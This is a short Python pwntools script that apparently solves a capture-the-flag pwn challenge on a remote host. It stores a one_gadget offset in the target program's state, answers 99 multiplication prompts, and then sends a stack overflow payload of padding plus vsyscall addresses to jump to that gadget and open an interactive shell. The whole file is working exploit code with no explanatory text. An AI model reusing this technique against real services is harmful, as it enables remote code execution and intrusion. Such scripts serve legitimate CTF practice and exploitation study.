from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')

# io = process('./pwn')
io = remote('111.200.241.244', 62611)
elf = ELF('./pwn')
libc = ELF('./libc.so')

one_gadget = 0x4526a - libc.symbols['system']

io.sendlineafter(b'Choice:\n', b'2')

io.sendlineafter(b'Choice:\n', b'1')
io.sendlineafter(b'How many levels?\n', b'0')
io.sendlineafter(b'Any more?\n', str(one_gadget).encode())

def calc():
	io.recvuntil('Question: ')
	a = int(io.recvuntil(' '))
	io.recvuntil(b'* ')
	b = int(io.recvuntil(' '))
	answer = a * b
	io.sendline(str(answer).encode())

for i in range(99):
	calc()

io.send(b'a' * 0x38 + p64(0xffffffffff600000) * 3)
io.interactive()